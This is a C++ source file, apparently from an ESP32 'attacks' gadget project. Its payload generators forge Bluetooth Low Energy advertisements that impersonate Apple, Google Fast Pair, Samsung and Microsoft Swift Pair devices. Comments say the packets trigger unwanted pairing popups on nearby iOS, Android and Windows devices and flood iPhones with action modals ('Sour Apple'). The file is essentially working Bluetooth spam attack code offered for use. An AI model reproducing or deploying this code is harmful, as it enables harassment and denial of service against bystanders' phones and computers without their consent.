rgomez31UAQ/ESP32-DIV_CYD-Gadget/bluetooth_attacks.cpp
static unsigned long lastDisplayUpdate = 0;

// ═══════════════════════════════════════════════════════════════════════════
// HELPER FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

static int getDeviceCount(int mode) {
    if (mode < 0 || mode >= MODE_COUNT) return 0;
    return MODE_DEVICE_COUNTS[mode];
}

static const char* getDeviceName(int mode, int idx) {
    switch (mode) {
        case MODE_APPLE_POPUP:   return (idx >= 0 && idx < APPLE_COUNT) ? APPLE_NAMES[idx] : "?";
        case MODE_SOUR_APPLE:    return (idx >= 0 && idx < SOUR_APPLE_COUNT) ? SOUR_APPLE_NAMES[idx] : "?";
        case MODE_FAST_PAIR:     return (idx >= 0 && idx < FAST_PAIR_COUNT) ? FAST_PAIR_NAMES[idx] : "?";
        case MODE_SAMSUNG_BUDS:  return (idx >= 0 && idx < SAMSUNG_BUDS_COUNT) ? SAMSUNG_BUDS_NAMES[idx] : "?";
        case MODE_SAMSUNG_WATCH: return (idx >= 0 && idx < SAMSUNG_WATCH_COUNT) ? SAMSUNG_WATCH_NAMES[idx] : "?";
        case MODE_SWIFT_PAIR:    return (idx >= 0 && idx < SWIFT_PAIR_COUNT) ? SWIFT_PAIR_NAMES[idx] : "?";
        case MODE_CHAOS:         return "CHAOS";
        default:                 return "?";
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// PAYLOAD GENERATORS
// ═══════════════════════════════════════════════════════════════════════════

// Apple Proximity Pairing (Type 0x07) - triggers iOS "nearby device" popup
static void getApplePopupPayload(BLEAdvertisementData& advData, int idx) {
    uint8_t pkt[31];
    pkt[0]  = 0x1E;  // AD Length (30 bytes follow)
    pkt[1]  = 0xFF;  // Manufacturer Specific Data
    pkt[2]  = 0x4C;  // Apple Inc (low byte)
    pkt[3]  = 0x00;  // Apple Inc (high byte)
    pkt[4]  = 0x07;  // Proximity Pairing type
    pkt[5]  = 0x19;  // Data length (25)
    pkt[6]  = 0x07;  // Prefix
    pkt[7]  = APPLE_MODELS[idx % APPLE_COUNT];  // Model byte
    pkt[8]  = 0x20;  // Common
    pkt[9]  = 0x75;  // Status
    pkt[10] = 0xAA;  // Battery
    pkt[11] = 0x30;  // Case
    pkt[12] = 0x01;  // Lid
    pkt[13] = 0x00;  // Color
    pkt[14] = 0x00;
    // Fill remaining 16 bytes with random data (makes each packet unique)
    esp_fill_random(&pkt[15], 16);
    advData.addData(std::string((char*)pkt, 31));
}

// Sour Apple Nearby Action (Type 0x0F) - floods iOS with action modals
static void getSourApplePayload(BLEAdvertisementData& advData, int typeIdx) {
    uint8_t pkt[17];
    int i = 0;
    pkt[i++] = 16;    // AD Length (16 bytes follow)
    pkt[i++] = 0xFF;  // Manufacturer Specific Data
    pkt[i++] = 0x4C;  // Apple Inc
    pkt[i++] = 0x00;
    pkt[i++] = 0x0F;  // Nearby Action type
    pkt[i++] = 0x05;  // Length
    pkt[i++] = 0xC1;  // Action flags
    pkt[i++] = SOUR_APPLE_TYPES[typeIdx % SOUR_APPLE_COUNT];
    // Random authentication tag (3 bytes)
    esp_fill_random(&pkt[i], 3);
    i += 3;
    pkt[i++] = 0x00;
    pkt[i++] = 0x00;
    pkt[i++] = 0x10;
    // Random tail (3 bytes)
    esp_fill_random(&pkt[i], 3);
    advData.addData(std::string((char*)pkt, 17));
}

// Google Fast Pair (Service UUID 0xFE2C) - triggers Android pairing notification
static void getFastPairPayload(BLEAdvertisementData& advData, int idx) {
    uint8_t pkt[14];
    int i = 0;
    // Flags AD structure
    pkt[i++] = 0x02;  // Length
    pkt[i++] = 0x01;  // Flags type
    pkt[i++] = 0x06;  // General Discoverable + BR/EDR Not Supported
    // Complete List of 16-bit Service UUIDs
    pkt[i++] = 0x03;  // Length
    pkt[i++] = 0x03;  // Complete 16-bit UUID list type
    pkt[i++] = 0x2C;  // FE2C (little-endian low)
    pkt[i++] = 0xFE;  // FE2C (little-endian high)
    // Service Data (FE2C + 3-byte Model ID)
    pkt[i++] = 0x06;  // Length
    pkt[i++] = 0x16;  // Service Data type
    pkt[i++] = 0x2C;  // FE2C (little-endian low)
    pkt[i++] = 0xFE;  // FE2C (little-endian high)
    const uint8_t* model = FAST_PAIR_MODELS[idx % FAST_PAIR_COUNT];
    pkt[i++] = model[0];
    pkt[i++] = model[1];
    pkt[i++] = model[2];
    advData.addData(std::string((char*)pkt, 14));
}

// Samsung Galaxy Buds (Company ID 0x0075) - triggers Samsung EasySetup popup
static void getSamsungBudsPayload(BLEAdvertisementData& advData, int idx) {
    uint8_t pkt[31];
    int i = 0;
    // Flags
    pkt[i++] = 0x02;
    pkt[i++] = 0x01;
    pkt[i++] = 0x06;
    // Manufacturer Specific Data
    pkt[i++] = 0x1B;  // AD Length = 27 bytes follow
    pkt[i++] = 0xFF;  // Manufacturer Specific Data type
    pkt[i++] = 0x75;  // Samsung company ID (low)
    pkt[i++] = 0x00;  // Samsung company ID (high)
    // Fixed EasySetup header (10 bytes)
    memcpy(&pkt[i], SAMSUNG_BUDS_HDR, 10);
    i += 10;
    // Device ID with 0x01 separator (4 bytes from 3-byte ID)
    const uint8_t* id = SAMSUNG_BUDS_IDS[idx % SAMSUNG_BUDS_COUNT];
    pkt[i++] = id[0];
    pkt[i++] = id[1];
    pkt[i++] = 0x01;  // Separator
    pkt[i++] = id[2];
    // Fixed EasySetup tail (10 bytes)
    memcpy(&pkt[i], SAMSUNG_BUDS_TAIL, 10);
    i += 10;
    advData.addData(std::string((char*)pkt, 31));
}

// Samsung Galaxy Watch (Company ID 0x0075) - triggers Samsung Watch pairing popup
static void getSamsungWatchPayload(BLEAdvertisementData& advData, int idx) {
    uint8_t pkt[18];
    int i = 0;
    // Flags
    pkt[i++] = 0x02;
    pkt[i++] = 0x01;
    pkt[i++] = 0x06;
    // Manufacturer Specific Data
    pkt[i++] = 0x0E;  // AD Length = 14 bytes follow
    pkt[i++] = 0xFF;  // Manufacturer Specific Data type
    pkt[i++] = 0x75;  // Samsung company ID (low)
    pkt[i++] = 0x00;  // Samsung company ID (high)
    // Fixed watch pairing header (10 bytes)
    memcpy(&pkt[i], SAMSUNG_WATCH_HDR, 10);
    i += 10;
    // Watch model ID (1 byte)
    pkt[i++] = SAMSUNG_WATCH_IDS[idx % SAMSUNG_WATCH_COUNT];
    advData.addData(std::string((char*)pkt, 18));
}

// Microsoft Swift Pair (Company ID 0x0006) - triggers Windows "device found" popup
static void getSwiftPairPayload(BLEAdvertisementData& advData, int idx) {
    const char* name = SWIFT_PAIR_NAMES[idx % SWIFT_PAIR_COUNT];
    int nameLen = strlen(name);
    if (nameLen > 20) nameLen = 20;  // Stay within 31-byte total limit

    uint8_t pkt[31];
    int i = 0;
    // Flags
    pkt[i++] = 0x02;
    pkt[i++] = 0x01;
    pkt[i++] = 0x06;
    // Manufacturer Specific Data
    pkt[i++] = (uint8_t)(6 + nameLen);  // AD Length
    pkt[i++] = 0xFF;  // Manufacturer Specific Data type
    pkt[i++] = 0x06;  // Microsoft company ID (low)
    pkt[i++] = 0x00;  // Microsoft company ID (high)
    pkt[i++] = 0x03;  // Swift Pair beacon type
    pkt[i++] = 0x00;  // Sub-scenario: LE only
    pkt[i++] = 0x80;  // Display name flag
    // Device name as ASCII
    memcpy(&pkt[i], name, nameLen);
    i += nameLen;
    advData.addData(std::string((char*)pkt, i));
}


// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING FUNCTIONS — Enhanced HaleHound Visual Suite
// FreeFont titles, double-border frames, skull watermark, gradient bars,
// pulsing status, activity EQ, broadcast flash effects
// ═══════════════════════════════════════════════════════════════════════════

